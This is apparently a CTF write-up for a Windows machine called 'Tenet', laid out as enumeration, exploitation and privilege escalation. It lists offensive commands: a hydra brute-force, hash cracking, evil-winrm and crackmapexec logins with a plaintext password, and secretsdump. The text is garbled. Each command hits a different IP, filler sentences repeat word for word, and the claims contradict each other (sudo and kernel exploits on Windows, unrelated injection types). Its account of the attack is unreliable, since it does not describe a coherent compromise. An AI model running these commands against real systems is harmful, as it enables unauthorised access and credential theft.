---
TitleSEO: "PwnTillDawn — Tenet (Insane Windows) | ZureFX"
TitlePost: "PwnTillDawn — Tenet (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Tenet. ACL Abuse and SQL Injection to achieve insane compromise on Windows."
Keywords: "ctf, hard, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-tenet-404.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tenet-404/"
Date: "2025-07-22"
Tags: "CTF, Hard, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-tenet-404"
Permalink: "/writeups/htb-tenet-404.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Tenet** is rated **Insane** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.129.78.115`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p5432,53,993 10.41.144.208 -oN scan.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.61.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p995,995,21 10.67.196.156 -oN scan.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.32.89.228/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **SQL Injection**.

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
evil-winrm -i 10.122.110.108 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.105.254.208
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.119.113.248 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.49.69.3 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p8888,5986,1521 10.34.169.64 -oN scan.txt
gobuster dir -u http://10.30.57.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `GetUserSPNs`
- `nikto`
- `mimikatz`
- `sqlmap`
- `metasploit`
- `gobuster`
- `GetNPUsers`

### Key Takeaways

- ACL Abuse
- SQL Injection
- Path Traversal
